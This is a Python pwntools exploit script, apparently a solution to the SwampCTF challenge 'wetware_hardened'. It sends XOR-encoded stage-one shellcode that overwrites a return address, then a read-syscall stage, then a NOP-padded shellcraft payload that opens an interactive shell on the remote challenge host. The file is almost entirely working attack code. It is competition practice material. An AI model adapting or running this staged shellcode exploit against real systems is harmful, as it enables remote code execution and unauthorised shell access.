from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./wetware_hardened")
else:
	p = remote("chal1.swampctf.com","1338")

def debugf():
	gdb.attach(p,"b *0x400168\nb *0x400194\nb *0x0x4001cd")
	#gdb.attach(p,"b *0x400168\nb *0x0x4001cd")

def gen_sc(sc,info):
	res = ""
	for i in range(len(sc)):
		res += chr(ord(sc[i]) ^ ord(info[i]))
	return res

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
context.bits = 64
context.arch = "amd64"
sc = asm("sub al,1;pop rsi;pop rsi") + "\xEB\xCA"
#debugf()
info = "0xd5    0x6e    0x68    0x6e    0x6e    0x31"
info = info.replace(" ","").split("0x")[1:]
res = ""
for i in range(len(info)):
	res += chr(int(info[i],16))
sc = gen_sc(sc,res)
sc = sc[:6] + "aa" + p64(0x4001A2)
p.sendafter("Holographic demux codephrase required: ",sc.strip("\x00") + "\x00")
sc2 = asm("add rdx,100;xor rax,rax;syscall")
p.send(sc2)
sc3 = asm(shellcraft.sh()).rjust(0x40,"\x90")
raw_input()
p.send(sc3)
p.interactive()
